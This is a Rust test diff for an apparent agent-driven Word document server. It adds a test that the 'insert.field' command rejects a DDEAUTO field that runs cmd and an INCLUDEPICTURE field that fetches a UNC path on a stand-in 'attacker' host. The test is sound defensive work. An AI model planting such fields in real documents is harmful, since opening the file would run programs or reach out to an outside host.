@@ -452,3 +452,15 @@ fn invalid_utf8_does_not_change_arguments_or_stop_later_requests() {
     assert_eq!(replies[1]["result"]["isError"], false);
     assert_eq!(tool(&mut s, "get_text", json!({}))["text"], "good", "malformed text must never reach the backend");
 }
+
+#[test]
+fn an_agent_cannot_insert_a_field_word_acts_on() {
+    // #3628: DDE starts a program and INCLUDEPICTURE fetches a UNC path when Word opens the file.
+    let mut s = Server::new(Box::new(Headless::default()));
+    tool(&mut s, "new_document", json!({}));
+    for instr in [r#"DDEAUTO cmd "/c calc""#, r#"INCLUDEPICTURE "\\attacker\share\x.png" \d"#] {
+        let r = call(&mut s, 9, "tools/call", json!({"name": "execute", "arguments": {"command": "insert.field", "params": {"instr": instr}}}));
+        assert_eq!(r["result"]["isError"], true, "{instr}: {r}");
+    }
+    tool(&mut s, "execute", json!({"command": "insert.field", "params": {"instr": "PAGE"}}));
+}
